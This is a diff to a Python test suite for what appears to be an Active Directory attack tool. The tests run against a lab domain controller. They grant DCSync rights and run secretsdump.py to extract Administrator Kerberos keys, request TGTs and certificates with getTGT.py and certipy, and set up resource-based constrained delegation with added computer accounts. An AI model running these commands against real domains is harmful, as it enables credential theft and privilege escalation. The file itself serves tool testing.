@@ -7,9 +7,9 @@ class TestModules(unittest.TestCase):
     def setUpClass(cls):
         conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
         cls.domain = conf["domain"]
-        cls.rootDomainNamingContext = ",".join(
-            ["DC=" + subdomain for subdomain in cls.domain.split(".")]
-        )
+        cls.rootDomainNamingContext = ",".join([
+            "DC=" + subdomain for subdomain in cls.domain.split(".")
+        ])
         cls.host = conf["pdc"]["ip"]
         cls.admin = {
             "username": conf["admin_user"]["username"],
@@ -26,30 +26,60 @@ class TestModules(unittest.TestCase):
             "-d",
             cls.domain,
         ]
-        cls.user = {"username": "stan.dard", "password": "Password123!"}
+        cls.user = {"username": "stan.dard", "password": "Password1123!"}
 
     def test_01AuthCreateUser(self):
         # Add User
         self.createUser(self.admin, self.user["username"], self.user["password"])
         username_pass = ["-u", self.user["username"], "-p"]
 
-        cleartext = username_pass + [self.admin["password"]]
+        cleartext = username_pass + [self.user["password"]]
         ntlm = username_pass + [
-            f":{md4.MD4(self.admin['password'].encode('utf-16le')).hexdigest()}"
+            f":{md4.MD4(self.user['password'].encode('utf-16le')).hexdigest()}"
         ]
 
-        self.launchProcess(
-            [
-                "getTGT.py",
-                "-dc-ip",
-                self.host,
-                f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
-            ]
-        )
+        self.launchProcess([
+            "getTGT.py",
+            "-dc-ip",
+            self.host,
+            f"{self.domain}/{self.admin['username']}:{self.admin['password']}",
+        ])
         self.env["KRB5CCNAME"] = f"{self.admin['username']}.ccache"
         krb = ["-k"]
 
-        cert = ["-c", ":Administrator.pem"]
+        self.launchProcess(
+            [
+                "certipy",
+                "req",
+                "-target",
+                self.host,
+                "-ca",
+                "bloody-ALLMIGHTY-CA-1",
+                "-template",
+                "User",
+                "-p",
+                self.admin["password"],
+                "-debug",
+                "-u",
+                f"{self.admin['username']}@{self.domain}",
+                "-out",
+                "bloodytest",
+            ],
+            ignoreErr=True,
+        )
+
+        self.launchProcess([
+            "openssl",
+            "pkcs12",
+            "-in",
+            "bloodytest.pfx",
+            "-out",
+            "bloodytest.pem",
+            "-nodes",
+            "-passin",
+            "pass:",
+        ])
+        cert = ["-c", ":bloodytest.pem"]
 
         auths = [cleartext, ntlm, krb, cert]
         for auth in auths:
@@ -85,7 +115,7 @@ class TestModules(unittest.TestCase):
         writableUserWrite = self.launchBloody(
             self.user, ["get", "writable", "--otype", "USER", "--right", "WRITE"]
         )
-        self.assertEqual(writableAll, writableUserWrite)
+        self.assertIn(writableUserWrite, writableAll)
 
         self.assertRegex(
             self.launchBloody(self.user, ["get", "membership", self.user["username"]]),
@@ -99,7 +129,7 @@ class TestModules(unittest.TestCase):
         )
 
     def test_03UacOwnerGenericShadowGroupPasswordDCSync(self):
-        slave = {"username": "slave", "password": "Password123!"}
+        slave = {"username": "slave", "password": "Password1243!"}
         # Tries another OU
         ou = "CN=FOREIGNSECURITYPRINCIPALS," + self.rootDomainNamingContext
         self.createUser(self.admin, slave["username"], slave["password"], ou=ou)
@@ -228,26 +258,22 @@ class TestModules(unittest.TestCase):
         )
         self.launchBloody(self.user, ["add", "dcsync", slave["username"]])
         self.assertRegex(
-            self.launchProcess(
-                [
-                    "secretsdump.py",
-                    "-just-dc-user",
-                    "Administrator",
-                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
-                ]
-            ),
+            self.launchProcess([
+                "secretsdump.py",
+                "-just-dc-user",
+                "Administrator",
+                f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
+            ]),
             "Kerberos keys grabbed",
         )
         self.launchBloody(self.user, ["remove", "dcsync", slave["username"]])
         self.assertNotRegex(
-            self.launchProcess(
-                [
-                    "secretsdump.py",
-                    "-just-dc-user",
-                    "Administrator",
-                    f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
-                ]
-            ),
+            self.launchProcess([
+                "secretsdump.py",
+                "-just-dc-user",
+                "Administrator",
+                f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
+            ]),
             "Kerberos keys grabbed",
         )
         self.launchBloody(
@@ -268,7 +294,7 @@ class TestModules(unittest.TestCase):
                 "add",
                 "computer",
                 hostname,
-                "Password123!",
+                "Password1234!",
                 "--ou",
                 "CN=COMPUTERS," + self.rootDomainNamingContext,
             ],
@@ -278,14 +304,15 @@ class TestModules(unittest.TestCase):
         )
 
         hostname2 = "test_pc2"
-        self.launchBloody(self.user, ["add", "computer", hostname2, "Password123!"])
+        hostname2_pass = "Password1235!"
+        self.launchBloody(self.user, ["add", "computer", hostname2, hostname2_pass])
         self.toTear.append(
             (self.launchBloody, self.admin, ["remove", "object", hostname2 + "$"])
         )
         self.launchBloody(self.user, ["add", "rbcd", hostname + "$", hostname2 + "$"])
 
         hostname3 = "test_pc3"
-        self.launchBloody(self.user, ["add", "computer", hostname3, "Password123!"])
+        self.launchBloody(self.user, ["add", "computer", hostname3, "Password1236!"])
         self.toTear.append(
             (self.launchBloody, self.admin, ["remove", "object", hostname3 + "$"])
         )
@@ -321,7 +348,7 @@ class TestModules(unittest.TestCase):
                     "Administrator",
                     "-dc-ip",
                     self.host,
-                    f"{self.domain}/{hostname2}$:Password123!",
+                    f"{self.domain}/{hostname2}$:{hostname2_pass}",
                 ],
                 False,
             ),
@@ -462,12 +489,13 @@ class TestModules(unittest.TestCase):
         cmd_creds = ["-u", creds["username"], "-p", creds["password"]]
         return self.launchProcess(self.bloody_prefix + cmd_creds + args, isErr, doPrint)
 
-    def launchProcess(self, cmd, isErr=True, doPrint=True):
+    def launchProcess(self, cmd, isErr=True, doPrint=True, ignoreErr=False):
         out, err = subprocess.Popen(
             cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, env=self.env
         ).communicate()
         out = out.decode()
-        self.assertFalse(isErr and err, self.printErr(err.decode(), cmd))
+        if not ignoreErr:
+            self.assertFalse(isErr and err, self.printErr(err.decode(), cmd))
         out += "\n" + err.decode()
         if doPrint:
             print(out)
